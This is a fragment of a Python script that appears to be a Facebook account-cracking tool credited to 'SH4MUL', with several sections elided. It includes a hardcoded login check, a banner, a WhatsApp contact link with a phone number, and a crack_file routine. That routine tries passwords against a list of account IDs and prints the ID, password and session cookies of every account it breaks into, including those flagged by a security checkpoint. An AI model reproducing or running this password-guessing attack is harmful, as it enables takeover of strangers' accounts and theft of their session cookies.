...
while attemps < 12345677901:
    ...
    if username == 'DANISH' and password == '19982018':
...
def banner():
	os.system("clear")
	print (f"""
  __  __ _____     _____ _    _ _  _   __  __ _    _ _      
 |  \/  |  __ \   / ____| |  | | || | |  \/  | |  | | |     
 | \  / | |__) | | (___ | |__| | || |_| \  / | |  | | |     
 | |\/| |  _  /   \___ \|  __  |__   _| |\/| | |  | | |     
 | |  | | | \ \   ____) | |  | |  | | | |  | | |__| | |____ 
 |_|  |_|_|  \_\ |_____/|_|  |_|  |_| |_|  |_|\____/|______|
                                                            
        
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO SH4MUL  X PIYAL  FIRE (🥰)
...
def login():
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801830733258')
	elif MAMA in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/SH4MUL.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#SH4MUL-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•OGM-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#SH4MUL-King
				print(f'\r\033[0;92m[SH4MUL-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " SH4MUL,  Ok,  id"')
